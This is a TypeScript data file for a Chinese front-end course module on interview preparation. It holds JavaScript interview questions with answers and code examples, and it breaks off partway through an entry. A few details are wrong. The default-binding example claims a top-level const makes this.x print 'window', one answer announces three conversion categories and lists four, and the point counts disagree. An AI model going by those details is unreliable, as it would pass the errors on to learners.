/**
 * 模块 25：面试八股与综合能力
 *
 * 严格遵循 docx/PROJECT_CONTENT.md 与 docx/模块二十五.md 设计文档：
 * - 15 个知识点（14 章节 + 1 面试模拟题测验）
 * - 6 个新增面试备考可视化组件 + 4 个复用核心组件
 *
 * 适配到项目现有 React+TS+Vite 架构，使用 ModuleMeta 数据驱动：
 * - KP1 JS 八股汇总（InterviewQuizEngine 面试问答引擎 + ConceptExplainViz 概念阐释）
 * - KP2 CSS 八股汇总（ConceptExplainViz + CompareTable CSS 高频题）
 * - KP3 框架八股（InterviewQuizEngine React/Vue 问答）
 * - KP4 网络八股（InterviewQuizEngine 网络问答）
 * - KP5 浏览器八股（CompareTable 浏览器高频题）
 * - KP6 安全八股（CompareTable 安全高频题）
 * - KP7 React vs Vue 全面对比（CompareTable）
 * - KP8 STAR 法则项目复盘（Accordion）
 * - KP9 项目难点梳理方法（Timeline）
 * - KP10 系统设计（SystemDesignBoard 系统设计题面板）
 * - KP11 系统设计方法论（ArchitectureDiagram）
 * - KP12 简历撰写技巧（Accordion）
 * - KP13 面试流程与技巧（Timeline）
 * - KP14 职业发展路径（Timeline）
 * - KP15 面试模拟题（MockInterviewTimer + ProgressDashboard + QuizCard）
 *
 * 覆盖 JS/CSS/框架/网络/浏览器/安全八股、STAR 法则、系统设计、
 * 简历面试技巧等面试冲刺核心知识体系，作为 25 个模块的收官之作。
 */
import type { ModuleMeta } from '../lib/types'

export const interviewPrepModule: ModuleMeta = {
  number: '25',
  title: '面试八股与综合能力',
  slug: 'interview-prep',
  stage: 'interview',
  stageLabel: '面试冲刺 · 第 2 模块',
  icon: '🎯',
  summary: 'JS/CSS/框架/网络/浏览器/安全八股、STAR 法则、系统设计、软技能协作、业务产品思维、简历面试技巧。',
  knowledgePointCount: 17,
  visualizationCount: 30,
  points: [
    // ========================================================================
    // 知识点 1：JavaScript 八股汇总
    // ========================================================================
    {
      order: 1,
      title: 'JavaScript 八股汇总',
      difficulty: 3,
      visualizationType: 'interview-quiz-engine',
      blocks: [
        {
          id: 'iv-p1-1',
          type: 'paragraph',
          lead: true,
          text: 'JavaScript 面试八股覆盖闭包、原型链、事件循环、this 指向、深浅拷贝等核心考点。以下通过面试问答引擎进行自测——先自己思考答案，再展开对比标准答案，自评掌握程度。',
        },
        {
          id: 'iv-p1-2',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'javascript',
            mode: 'sequential',
            questions: [
              {
                id: 'javascript-closure',
                domain: 'javascript',
                question: '什么是闭包？请举例说明其应用场景和潜在问题。',
                shortAnswer: '闭包是函数与其词法作用域的组合，使内部函数可以访问外部函数的变量。应用：数据私有化、模块化、柯里化。问题：内存泄漏、变量共享。',
                detailedAnswer: '闭包是指有权访问另一个函数作用域中变量的函数。创建闭包的常见方式是在一个函数内部创建另一个函数。闭包的本质是函数与其词法环境的引用的组合。当内部函数被返回到外部执行时，它仍然持有对外部函数变量的引用，形成闭包。\n\n应用场景：1) 数据私有化（模块模式）；2) 函数柯里化；3) 回调函数中的状态保持；4) 防抖节流实现。\n\n潜在问题：1) 内存泄漏（意外持有大对象引用）；2) for 循环中 var 变量共享问题（需用 let 或 IIFE 解决）；3) 性能考量（闭包比普通函数消耗更多内存）。',
                codeExample: `// 闭包经典示例：计数器
function createCounter() {
  let count = 0;  // 外部函数变量
  return {
    increment() { count++; },       // 闭包访问 count
    getCount() { return count; },   // 闭包访问 count
  };
}
const counter = createCounter();
counter.increment();
console.log(counter.getCount()); // 1
// count 变量被"封闭"在闭包中，外部无法直接访问

// 经典陷阱：for + var + setTimeout
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // 输出 3,3,3
}
// 解决：用 let 或 IIFE
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // 输出 0,1,2
}`,
                difficulty: 'medium',
                tags: ['闭包', '作用域', '面试必考'],
                keyPoints: ['闭包 = 函数 + 词法作用域', '可访问外部函数变量', '应用：私有化/模块/柯里化', '问题：内存泄漏/var 陷阱'],
              },
              {
                id: 'javascript-prototype',
                domain: 'javascript',
                question: '请解释 JavaScript 的原型链机制，如何实现继承？',
                shortAnswer: '每个对象有 __proto__ 指向其构造函数的 prototype，形成原型链。访问属性时沿原型链向上查找。继承方式：原型链继承、构造函数继承、组合继承、ES6 class extends。',
                detailedAnswer: 'JavaScript 是基于原型的语言。每个对象都有一个内部属性 [[Prototype]]（通过 __proto__ 访问），指向其构造函数的 prototype 对象。当访问对象的属性时，如果对象本身没有该属性，会沿 __proto__ 向上查找，直到找到或到达 null，这条链就是原型链。\n\n继承方式演进：\n1. 原型链继承：Child.prototype = new Parent()——问题：引用类型属性共享\n2. 构造函数继承：Parent.call(this)——问题：无法继承原型方法\n3. 组合继承：原型链 + 构造函数——最常用的 ES5 方式\n4. 寄生组合继承：Object.create(Parent.prototype)——最优 ES5 方式\n5. ES6 class extends：语法糖，本质是寄生组合继承',
                codeExample: `// ES6 class 继承（推荐）
class Animal {
  constructor(name) { this.name = name; }
  speak() { console.log(\`\${this.name} makes a sound\`); }
}
class Dog extends Animal {
  speak() { super.speak(); console.log(\`\${this.name} barks\`); }
}

// 原型链查找过程
// dog → Dog.prototype → Animal.prototype → Object.prototype → null`,
                difficulty: 'medium',
                tags: ['原型链', '继承', '面试必考'],
                keyPoints: ['__proto__ 指向构造函数的 prototype', '属性查找沿原型链向上', '继承方式演进', 'ES6 class 是语法糖'],
              },
              {
                id: 'javascript-event-loop',
                domain: 'javascript',
                question: '请详细描述 JavaScript 的事件循环机制，宏任务和微任务的区别？',
                shortAnswer: '事件循环是 JS 的并发模型：调用栈执行同步代码→清空微任务队列→取一个宏任务执行→循环。微任务（Promise.then、queueMicrotask）优先于宏任务（setTimeout、setInterval）执行。',
                detailedAnswer: 'JavaScript 是单线程语言，通过事件循环实现异步。事件循环流程：\n1. 执行调用栈中的同步代码\n2. 调用栈清空后，执行所有微任务（microtask queue）\n3. 执行渲染（浏览器）\n4. 从宏任务队列取一个任务执行\n5. 回到步骤 2\n\n微任务：Promise.then/catch/finally、queueMicrotask、MutationObserver、process.nextTick（Node）\n宏任务：setTimeout、setInterval、setImmediate（Node）、I/O、UI 事件\n\n关键区别：每次宏任务执行后，会清空所有微任务，再执行下一个宏任务。这就是 Promise.then 总是在下一个 setTimeout 之前执行的原因。',
                codeExample: `console.log('1: 同步');

setTimeout(() => console.log('4: 宏任务'), 0);

Promise.resolve().then(() => console.log('3: 微任务'));

console.log('2: 同步');

// 输出顺序：1 → 2 → 3 → 4
// 解析：同步代码先执行（1,2），然后清空微任务（3），最后宏任务（4）`,
                difficulty: 'hard',
                tags: ['事件循环', '异步', '宏任务', '微任务', '面试必考'],
                keyPoints: ['单线程 + 事件循环', '同步→微任务→宏任务', '微任务每次清空', 'Promise.then 优先于 setTimeout'],
              },
              {
                id: 'javascript-this',
                domain: 'javascript',
                question: 'JavaScript 中 this 的指向规则是什么？如何改变 this 指向？',
                shortAnswer: 'this 指向取决于调用方式：默认绑定（window/undefined）、隐式绑定（对象方法）、显式绑定（call/apply/bind）、new 绑定（新对象）。箭头函数继承外层 this。优先级：new > 显式 > 隐式 > 默认。',
                detailedAnswer: 'this 的四种绑定规则：\n1. 默认绑定：独立函数调用，非严格模式指向 window，严格模式 undefined\n2. 隐式绑定：作为对象方法调用，this 指向该对象\n3. 显式绑定：call/apply/bind 手动指定 this\n4. new 绑定：构造函数中的 this 指向新创建的对象\n\n优先级：new > 显式 > 隐式 > 默认\n\n箭头函数没有自己的 this，继承外层作用域的 this，且不能用 call/apply/bind 改变。\n\n常见陷阱：回调函数中的 this 丢失（需用 bind/箭头函数/that 变量解决）。',
                codeExample: `// 四种绑定规则
function show() { console.log(this.x); }

// 1. 默认绑定
const x = 'window';
show(); // 'window'（非严格模式）

// 2. 隐式绑定
const obj = { x: 'obj', show };
obj.show(); // 'obj'

// 3. 显式绑定
show.call({ x: 'call' }); // 'call'

// 4. new 绑定
function Foo() { this.x = 'new'; }
new Foo(); // this.x = 'new'

// 箭头函数继承外层 this
const arrow = {
  x: 'arrow',
  show: () => console.log(this.x), // 继承外层（window）
};`,
                difficulty: 'medium',
                tags: ['this', '作用域', '面试必考'],
                keyPoints: ['四种绑定规则', '优先级：new>显式>隐式>默认', '箭头函数无 this', '回调 this 丢失陷阱'],
              },
              {
                id: 'javascript-deep-copy',
                domain: 'javascript',
                question: '实现深拷贝的方法有哪些？各有什么优缺点？如何处理循环引用？',
                shortAnswer: '方法：JSON.parse(JSON.stringify())（简单但无法处理函数/循环引用）、递归+WeakMap（完整方案）、structuredClone（原生 API）。循环引用用 WeakMap 缓存已拷贝对象解决。',
                detailedAnswer: '深拷贝方法对比：\n1. JSON.parse(JSON.stringify())：简单快速，但无法处理 function、undefined、Symbol、循环引用、Date/RegExp 等\n2. 递归 + WeakMap：可处理所有类型，WeakMap 解决循环引用\n3. structuredClone()：浏览器原生 API，支持循环引用和大部分类型，但不支持函数\n4. lodash _.cloneDeep()：成熟的第三方方案\n\n循环引用解决方案：用 WeakMap 缓存已拷贝的对象，递归前检查是否已拷贝，已拷贝则直接返回缓存引用。',
                codeExample: `function deepClone(obj, cache = new WeakMap()) {
  if (obj === null || typeof obj !== 'object') return obj;
  if (cache.has(obj)) return cache.get(obj); // 循环引用检测
  if (obj instanceof Date) return new Date(obj);
  if (obj instanceof RegExp) return new RegExp(obj);
  const clone = Array.isArray(obj) ? [] : {};
  cache.set(obj, clone); // 先缓存再递归
  for (const key of Reflect.ownKeys(obj)) {
    clone[key] = deepClone(obj[key], cache);
  }
  return clone;
}`,
                difficulty: 'medium',
                tags: ['深拷贝', '循环引用', 'WeakMap'],
                keyPoints: ['JSON 方案的局限性', 'WeakMap 解决循环引用', '处理 Date/RegExp', '先缓存再递归'],
              },
              {
                id: 'javascript-promise',
                domain: 'javascript',
                question: 'Promise 的状态有哪些？链式调用的原理是什么？如何实现错误穿透？',
                shortAnswer: 'Promise 有三种状态：pending/fulfilled/rejected，状态一旦变更不可逆。链式调用通过 then 返回新 Promise 实现。错误穿透靠 then 链中未传 onRejected 时默认转发。',
                detailedAnswer: 'Promise 是异步操作的最终结果容器。三种状态：pending（初始）、fulfilled（成功）、rejected（失败）。状态变更单向不可逆：pending→fulfilled 或 pending→rejected。\n\n链式调用原理：then/catch/finally 返回一个新的 Promise，其状态由回调的返回值决定：\n1. 回调返回普通值→新 Promise fulfilled 该值\n2. 回调返回 Promise→新 Promise 等待该 Promise\n3. 回调抛错→新 Promise rejected 该错误\n\n错误穿透：then 未传第二个参数时，onRejected 默认为 err => { throw err }，错误会沿链向后传递，直到遇到 catch 或传了 onRejected 的 then。',
                codeExample: `Promise.resolve(1)
  .then(v => v + 1)         // fulfilled: 2
  .then(v => { throw new Error('x') }) // rejected: Error
  .then(v => v + 1)         // 未传 onRejected，错误穿透
  .catch(err => console.log(err.message)) // 'x'`,
                difficulty: 'medium',
                tags: ['Promise', '异步', '链式调用'],
                keyPoints: ['三态且不可逆', 'then 返回新 Promise', '错误默认转发', 'catch 是 then(undefined, fn)'],
              },
              {
                id: 'javascript-async-await',
                domain: 'javascript',
                question: 'async/await 相比 Promise 的优势是什么？其原理是什么？',
                shortAnswer: 'async/await 用同步写法写异步代码，可读性更好，便于 try/catch 捕获错误。原理是 Generator + Promise 的语法糖，async 函数返回 Promise，await 暂停执行等待 Promise 完成。',
                detailedAnswer: 'async/await 是 ES2017 引入的异步语法糖，本质是 Generator + Promise 的自动化执行。\n\n优势：\n1. 同步风格写异步，避免 then 链嵌套\n2. try/catch 可捕获 await 的错误（Promise 链需用 catch）\n3. 调试友好（断点能停在 await 行）\n4. 条件/循环中处理异步更直观\n\n原理：\n- async 函数始终返回 Promise，返回值被 Promise.resolve 包装\n- await 会暂停函数执行，交出控制权，等 Promise resolve 后用 resolve 值继续执行\n- await 的 Promise reject 会抛异常，可被 try/catch 捕获\n\n注意：多个独立异步操作应用 Promise.all 并行，避免串行 await 影响性能。',
                codeExample: `// 串行（慢）
async function serial() {
  const a = await fetch('/api/a');
  const b = await fetch('/api/b');
  return [a, b];
}
// 并行（快）
async function parallel() {
  const [a, b] = await Promise.all([fetch('/api/a'), fetch('/api/b')]);
  return [a, b];
}`,
                difficulty: 'medium',
                tags: ['async', 'await', 'Promise', '语法糖'],
                keyPoints: ['async 返回 Promise', 'await 暂停执行', 'try/catch 捕获错误', '独立任务用 Promise.all'],
              },
              {
                id: 'javascript-debounce-throttle',
                domain: 'javascript',
                question: '防抖和节流的区别？分别适用于什么场景？请手写实现。',
                shortAnswer: '防抖：事件停止触发 n 秒后执行一次（如搜索框）。节流：n 秒内只执行一次（如滚动监听）。防抖重置定时器，节流维持定时器到期。',
                detailedAnswer: '防抖（debounce）：高频事件触发后，每次触发都重置定时器，只有停止触发超过设定时间才执行。适用于搜索输入、窗口 resize、表单校验。\n\n节流（throttle）：高频事件触发后，在设定时间内只执行一次，期间再触发也不执行，等下个周期。适用于滚动加载、鼠标移动、按钮防连点。\n\n核心区别：防抖是"只执行最后一次"，节流是"固定频率执行"。\n\n实现要点：\n1. 用闭包保存定时器/时间戳\n2. 防抖：每次清除旧定时器，设新定时器\n3. 节流：判断距上次执行是否超过间隔，超过才执行',
                codeExample: `// 防抖
function debounce(fn, delay) {
  let timer;
  return function (...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}
// 节流（时间戳版）
function throttle(fn, interval) {
  let last = 0;
  return function (...args) {
    const now = Date.now();
    if (now - last >= interval) {
      last = now;
      fn.apply(this, args);
    }
  };
}`,
                difficulty: 'medium',
                tags: ['防抖', '节流', '性能优化', '手写题'],
                keyPoints: ['防抖重置定时器', '节流固定频率', '搜索框用防抖', '滚动用节流'],
              },
              {
                id: 'javascript-var-let-const',
                domain: 'javascript',
                question: 'var、let、const 的区别？什么是变量提升和暂时性死区？',
                shortAnswer: 'var 有变量提升、函数作用域、可重复声明；let/const 有暂时性死区（TDZ）、块级作用域、不可重复声明；const 声明后必须赋值且引用不可变。提升在作用域顶部，TDZ 在声明前访问报错。',
                detailedAnswer: '三者区别：\n1. 作用域：var 是函数作用域；let/const 是块级作用域（{}内）\n2. 提升：var 声明会提升到作用域顶部，值为 undefined；let/const 也会提升，但在声明前处于"暂时性死区"（TDZ），访问报 ReferenceError\n3. 重复声明：var 允许；let/const 同作用域内禁止\n4. 全局属性：var 声明的全局变量挂到 window；let/const 不会\n5. const 特殊：声明时必须初始化，且绑定的引用不可变（对象内部属性可改）\n\n变量提升：JS 引擎在执行前会先收集所有 var 声明和 function 声明，提前到作用域顶部。\n\n暂时性死区：let/const 虽然也提升，但在执行到声明语句前，变量不可访问，这段区域叫 TDZ。这是为了规避 var 提升导致的"未声明即可用"问题。',
                codeExample: `console.log(a); // undefined（var 提升）
var a = 1;
console.log(b); // ReferenceError（TDZ）
let b = 2;

// 块级作用域
{
  var c = 3;   // 函数/全局作用域
  let d = 4;   // 仅块内
}
console.log(c); // 3
console.log(d); // ReferenceError

const obj = { x: 1 };
obj.x = 2;      // OK（引用不变，属性可改）
obj = {};       // TypeError（引用不可变）`,
                difficulty: 'easy',
                tags: ['var', 'let', 'const', '变量提升', 'TDZ'],
                keyPoints: ['var 函数作用域', 'let/const 块级作用域', 'TDZ 报 ReferenceError', 'const 引用不可变'],
              },
              {
                id: 'javascript-module',
                domain: 'javascript',
                question: 'CommonJS 和 ES Module 的区别？为什么 ESM 支持 Tree Shaking？',
                shortAnswer: 'CommonJS 是运行时加载、同步、值拷贝；ESM 是编译时静态分析、异步、值引用（live binding）。Tree Shaking 依赖 ESM 的静态结构，能在编译期确定哪些导出未使用并删除。',
                detailedAnswer: 'CommonJS（CJS）：\n1. 运行时加载（require 执行时才求值）\n2. 同步加载（适合服务端文件系统）\n3. 输出值拷贝（模块内部变化不影响已导入的值）\n4. module.exports / require\n\nES Module（ESM）：\n1. 编译时静态分析（import 在顶层，结构可静态确定）\n2. 异步加载（适合浏览器）\n3. 值引用（live binding，模块内部变化反映到导入方）\n4. export / import\n\nTree Shaking 原理：ESM 的 import/export 是静态声明，打包器（Webpack/Rollup）能在编译阶段分析出哪些导出未被使用，直接删除死代码。CJS 的 require 是动态表达式，无法静态判断，故不支持。\n\n副作用：Tree Shaking 还需 package.json 标记 sideEffects: false，否则即使未使用的模块也可能因副作用保留。',
                codeExample: `// CJS：值拷贝
// lib.js
let count = 0;
module.exports = { count, add() { count++; } };
// main.js
const { count, add } = require('./lib');
add();
console.log(count); // 0（拷贝，未变）

// ESM：值引用
// lib.js
export let count = 0;
export function add() { count++; }
// main.js
import { count, add } from './lib';
add();
console.log(count); // 1（引用，同步变化）`,
                difficulty: 'medium',
                tags: ['CommonJS', 'ESM', '模块化', 'Tree Shaking'],
                keyPoints: ['CJS 运行时同步', 'ESM 编译时静态', 'CJS 值拷贝 ESM 值引用', 'Tree Shaking 需静态结构'],
              },
              {
                id: 'javascript-gc',
                domain: 'javascript',
                question: 'JavaScript 的垃圾回收机制是什么？如何检测和处理内存泄漏？',
                shortAnswer: 'V8 用分代回收：新生代用 Scavenge（复制算法），老生代用标记清除+标记整理。内存泄漏常见于：意外全局变量、未清除定时器/监听、闭包持有大对象、DOM 引用。用 Chrome Memory 面板和 WeakMap 检测处理。',
                detailedAnswer: 'V8 垃圾回收采用分代策略：\n1. 新生代（短生命周期）：Scavenge 算法，将堆分为 From/To 两半，存活对象从 From 复制到 To，清空 From，角色互换。经历过一次 GC 仍存活或占用超 25% 的对象晋升到老生代。\n2. 老生代（长生命周期）：标记清除（Mark-Sweep）回收无引用对象，标记整理（Mark-Compact）解决内存碎片，将存活对象向一端移动。\n\n可达性分析：从 GC Roots（全局变量、当前栈、DOM 节点等）出发遍历引用链，不可达对象被回收。\n\n内存泄漏常见场景：\n1. 意外全局变量（未用 let/var）\n2. 未清除的 setInterval/setTimeout\n3. 未移除的事件监听器\n4. 闭包持有不再需要的变量\n5. 脱离 DOM 的引用（变量持有已移除节点）\n6. 缓存无上限增长\n\n检测工具：Chrome DevTools Memory 面板（Heap Snapshot 对比、Allocation Timeline）、Performance 监控内存曲线。',
                codeExample: `// 泄漏示例：定时器持有闭包
function leak() {
  const bigData = new Array(1e6);
  setInterval(() => console.log(bigData.length), 1000);
}
// 修复：保存 id，不需要时清除
let timer;
function safe() {
  const bigData = new Array(1e6);
  timer = setInterval(() => console.log(bigData.length), 1000);
}
function stop() { clearInterval(timer); }

// 用 WeakMap 避免泄漏：键被回收时值自动清理
const cache = new WeakMap();
function memoize(obj) {
  if (!cache.has(obj)) cache.set(obj, compute(obj));
  return cache.get(obj);
}`,
                difficulty: 'hard',
                tags: ['垃圾回收', '内存泄漏', 'V8', 'WeakMap'],
                keyPoints: ['新生代 Scavenge', '老生代标记清除/整理', '可达性分析', '泄漏：定时器/监听/闭包'],
              },
              {
                id: 'javascript-type-conversion',
                domain: 'javascript',
                question: 'JavaScript 的隐式类型转换规则是什么？[] == ![] 为什么是 true？',
                shortAnswer: '隐式转换遵循：== 比较时转数字、+ 运算偏好字符串、if/条件转布尔。[] == ![] 为 true 因为：![] 转布尔为 false，[] == false 转 [] == 0，[] 转 [0]→0，0 == 0。',
                detailedAnswer: 'JS 类型转换分三类：ToPrimitive、ToNumber、ToString、ToBoolean。\n\nToPrimitive 规则：\n1. 先调用对象的 valueOf()，若返回原始值则用\n2. 否则调用 toString()，返回原始值则用\n3. 都不返回原始值抛 TypeError\n\n== 比较规则（核心）：\n1. 布尔→数字（true→1, false→0）\n2. 字符串→数字（"5"→5）\n3. 对象→原始值（ToPrimitive）\n4. null == undefined（true），但 null == 0（false）\n\n[] == ![] 解析：\n1. ![] 先转布尔，[] 是对象→true，!true=false\n2. [] == false → false 转数字 0 → [] == 0\n3. [] ToPrimitive：valueOf 返回 [] 非原始值，toString 返回 "" → "" == 0\n4. "" 转数字 0 → 0 == 0 → true\n\n+ 运算：若有字符串则全转字符串拼接；否则转数字相加。',
                codeExample: `// 经典坑
[] + []      // ""（两个 [] 都转 ""）
[] + {}      // "[object Object]"
{} + []      // 0（{} 被解析为块语句）
1 + "2"      // "12"（字符串拼接）
"5" - 2      // 3（- 只做数字运算）
null == 0    // false（null 只与 undefined 相等）
null == undefined // true

// 推荐实践：始终用 ===，避免隐式转换坑`,
                difficulty: 'hard',
                tags: ['类型转换', '隐式转换', '==', 'ToPrimitive'],
                keyPoints: ['ToPrimitive：valueOf→toString', '== 转数字优先', '[] == ![] 经典案例', '推荐用 ==='],
              },
              {
                id: 'javascript-equality',
                domain: 'javascript',
                question: '== 和 === 的区别？Object.is 与它们有何不同？',
                shortAnswer: '== 会隐式类型转换后比较；=== 严格相等不转换，类型不同直接 false；Object.is 更严格，区分 +0/-0 和 NaN。推荐默认用 ===，特殊场景用 Object.is。',
                detailedAnswer: '三者区别：\n1. ==（宽松相等）：比较前进行类型转换（参考上题规则），容易出现意外结果\n2. ===（严格相等）：类型不同直接返回 false；类型相同时比较值（NaN≠NaN，+0===-0）\n3. Object.is：与 === 类似，但修正了两个边界：Object.is(NaN, NaN)===true，Object.is(+0, -0)===false\n\n== 的坑：\n- 0 == "" // true\n- 0 == "0" // true\n- false == "0" // true\n- null == undefined // true\n- NaN == NaN // false\n\n推荐实践：\n1. 默认用 ===，避免隐式转换\n2. 判断 NaN 用 Number.isNaN 或 Object.is(x, NaN)\n3. 判断 +0/-0 用 Object.is\n4. 判断 null/undefined 用 x == null（仅此场景 == 可接受）',
                codeExample: `0 == ''        // true（隐式转换）
0 === ''       // false（类型不同）
NaN === NaN    // false
Object.is(NaN, NaN)   // true
+0 === -0      // true
Object.is(+0, -0)     // false

// 实用判断
const isNullish = x => x == null;       // null 或 undefined
const isNaNSafe = x => Number.isNaN(x); // 比 isNaN 更安全
const sameValue = (a, b) => Object.is(a, b); // 最严格`,
                difficulty: 'easy',
                tags: ['==', '===', 'Object.is', '相等比较'],
                keyPoints: ['== 会类型转换', '=== 严格不转换', 'Object.is 修正 +0/-0 和 NaN', '默认用 ==='],
              },
              {
                id: 'javascript-array-methods',
                domain: 'javascript',
                question: '数组方法 map/forEach/filter/reduce 的区别？reduce 有哪些高级用法？',
                shortAnswer: 'map 返回新数组（映射）、forEach 无返回（遍历）、filter 返回新数组（过滤）、reduce 累加成单值。reduce 可实现：扁平化、分组、去重、pipe 函数组合、求最值等。',
                detailedAnswer: '数组遍历方法对比：\n1. map：对每元素调用回调，返回新数组，不修改原数组\n2. forEach：对每元素调用回调，无返回值，不能用 break（可用 some/every 模拟）\n3. filter：回调返回 true 的元素组成新数组\n4. reduce：从左到右累加，回调 (acc, cur, idx, arr) => newAcc，初始值可选\n5. reduceRight：从右到左\n\n关键区别：map/filter 返回数组，reduce 返回任意值；forEach 不能链式；map/filter/forEach 不修改原数组但回调里可修改元素（引用类型）。\n\nreduce 高级用法：\n1. 求和/积：arr.reduce((a,b)=>a+b)\n2. 扁平化：arr.reduce((a,b)=>a.concat(b), [])\n3. 分组：按 key 分组成对象\n4. 去重：reduce + includes\n5. pipe：函数组合 fn1(fn2(fn3(x)))\n6. 求最值：reduce((a,b)=>Math.max(a,b))\n7. 计数：统计元素出现次数',
                codeExample: `// 分组
const groupBy = (arr, key) =>
  arr.reduce((acc, item) => {
    (acc[item[key]] = acc[item[key]] || []).push(item);
    return acc;
  }, {});
groupBy([{team:'A'},{team:'B'},{team:'A'}], 'team');
// { A: [{team:'A'},{team:'A'}], B: [{team:'B'}] }

// 函数组合 pipe
const pipe = fns => x => fns.reduce((v, f) => f(v), x);
const fn = pipe([x=>x+1, x=>x*2, x=>x-3]);
fn(5); // (5+1)*2-3 = 9`,
                difficulty: 'medium',
                tags: ['数组方法', 'reduce', 'map', 'filter'],
                keyPoints: ['map 返回新数组', 'forEach 无返回', 'reduce 累加', 'reduce 可分组/pipe'],
              },
              {
                id: 'javascript-type-check',
                domain: 'javascript',
                question: '如何准确判断 JavaScript 的数据类型？typeof/instanceof/Object.prototype.toString 各有什么局限？',
                shortAnswer: 'typeof 判断原始类型（null 除外）和 function；instanceof 判断对象具体类型（跨 iframe 失效）；Object.prototype.toString.call 最准确。null 用 ===，NaN 用 Number.isNaN。',
                detailedAnswer: '类型判断方法对比：\n1. typeof：\n   - 优点：能区分原始类型和函数\n   - 局限：typeof null === "object"（历史 bug）；无法区分对象子类型（数组/对象/日期都返回 "object"）\n2. instanceof：\n   - 原理：沿原型链查找 constructor.prototype\n   - 优点：能判断对象具体类型（[] instanceof Array === true）\n   - 局限：只能判断对象，不能判断原始类型（"a" instanceof String === false，除非 new String）；跨 iframe/窗口失效（不同全局环境的 Array 不共享）\n3. Object.prototype.toString.call：\n   - 原理：调用 Object 原生的 toString，返回 "[object Type]"\n   - 优点：最准确，能区分所有内置类型，跨 iframe 有效\n   - 用法：Object.prototype.toString.call(x).slice(8, -1)\n4. Array.isArray：判断数组最可靠（ES5+，跨 iframe 有效）\n5. Number.isNaN：判断 NaN（比全局 isNaN 严格，不做类型转换）',
                codeExample: `// 各种判断
typeof 'a'        // 'string'
typeof null       // 'object'（bug）
typeof function(){} // 'function'
[] instanceof Array // true
'abc' instanceof String // false（原始值）

// 最通用
const getType = x =>
  Object.prototype.toString.call(x).slice(8, -1).toLowerCase();
getType(null)      // 'null'
getType([])        // 'array'
getType(new Date)  // 'date'
getType(/a/)       // 'regexp'

// 特殊值
Number.isNaN(NaN)  // true
isNaN('abc')       // true（先转数字）`,
                difficulty: 'medium',
                tags: ['类型判断', 'typeof', 'instanceof', 'toString'],
                keyPoints: ['typeof null 是 object', 'instanceof 跨 iframe 失效', 'toString.call 最准', 'Array.isArray 可靠'],
              },
              {
                id: 'javascript-new-operator',
                domain: 'javascript',
                question: 'new 操作符做了什么？如何手写实现一个 new？',
                shortAnswer: 'new 做四件事：1) 创建新对象；2) 链接到构造函数的 prototype；3) 绑定 this 执行构造函数；4) 若返回对象则用之，否则返回新对象。手写：Object.create + apply + 返回值判断。',
                detailedAnswer: 'new 操作符的执行过程：\n1. 创建一个全新的空对象\n2. 将新对象的 __proto__ 指向构造函数的 prototype（建立原型链）\n3. 将构造函数的 this 绑定到新对象，执行构造函数（添加属性方法）\n4. 判断构造函数返回值：如果是对象则返回该对象，否则返回新对象\n\n关键点：\n- 构造函数 return 原始值会被忽略，return 对象会替代新对象\n- 若构造函数原型上有 return 原始值也忽略\n- new.target 可判断是否被 new 调用\n\n手写实现要点：\n1. 用 Object.create(Fn.prototype) 创建对象并设原型链\n2. 用 Fn.apply(obj, args) 执行构造函数\n3. 判断返回值类型决定返回',
                codeExample: `function myNew(Fn, ...args) {
  // 1+2. 创建对象并链接原型
  const obj = Object.create(Fn.prototype);
  // 3. 绑定 this 执行
  const result = Fn.apply(obj, args);
  // 4. 返回值判断
  return result instanceof Object ? result : obj;
}

function Person(name) {
  this.name = name;
  // return 'string';  // 原始值被忽略
  // return { custom: true }; // 对象会替代
}
const p = myNew(Person, 'Alice');
console.log(p instanceof Person); // true
console.log(p.name); // 'Alice'`,
                difficulty: 'medium',
                tags: ['new', '构造函数', '原型链', '手写题'],
                keyPoints: ['创建对象+链接原型', '绑定 this 执行', '返回对象则替代', 'Object.create 实现'],
              },
              {
                id: 'javascript-call-apply-bind',
                domain: 'javascript',
                question: 'call/apply/bind 的区别？如何手写实现一个 bind？',
                shortAnswer: 'call/apply 立即执行并改变 this，call 接收参数列表，apply 接收数组；bind 返回新函数永久绑定 this，不立即执行。手写 bind：返回新函数+apply+原型继承。',
                detailedAnswer: '三者都是改变函数 this 指向的方法，区别：\n1. call(thisArg, arg1, arg2, ...)：立即执行，参数逐个传递\n2. apply(thisArg, [argsArray])：立即执行，参数以数组形式传递\n3. bind(thisArg, arg1, ...)：不立即执行，返回一个永久绑定 this 的新函数\n\n核心区别：\n- call/apply 会立即调用原函数；bind 返回新函数，需手动调用\n- call/apply 是临时绑定（仅本次调用）；bind 是永久绑定（返回的函数 this 永远不变）\n- bind 还支持柯里化（预设部分参数）\n\n手写 bind 要点：\n1. 返回一个新函数（闭包保存 this 和参数）\n2. 新函数调用时用 apply 绑定 this\n3. 支持作为构造函数（new 时 this 指向新对象，需忽略 bind 的 this）\n4. 继承原函数原型（new 出的实例能访问原函数原型方法）',
                codeExample: `// 原生用法
const obj = { name: 'Alice' };
function greet(greeting, punct) {
  return greeting + ', ' + this.name + punct;
}
greet.call(obj, 'Hi', '!');      // 'Hi, Alice!'
greet.apply(obj, ['Hi', '!']);   // 'Hi, Alice!'
const bound = greet.bind(obj, 'Hi');
bound('?'); // 'Hi, Alice?'

// 手写 bind
Function.prototype.myBind = function (ctx, ...args) {
  const fn = this;
  const bound = function (...rest) {
    // 作为构造函数时 this 是新实例，应忽略 ctx
    return fn.apply(this instanceof fn ? this : ctx, [...args, ...rest]);
  };
  // 继承原型（用于 new 场景）
  bound.prototype = Object.create(fn.prototype);
  return bound;
};`,
                difficulty: 'medium',
                tags: ['call', 'apply', 'bind', 'this', '手写题'],
                keyPoints: ['call/apply 立即执行', 'bind 返回新函数', 'bind 支持柯里化', '手写需处理 new'],
              },
              {
                id: 'javascript-arrow-function',
                domain: 'javascript',
                question: '箭头函数和普通函数有什么区别？为什么不能作为构造函数？',
                shortAnswer: '箭头函数：无自己的 this/arguments/super/new.target（继承外层）、不能 new、无 prototype。适合回调；不适合对象方法、构造函数、原型方法。this 在定义时确定不可变。',
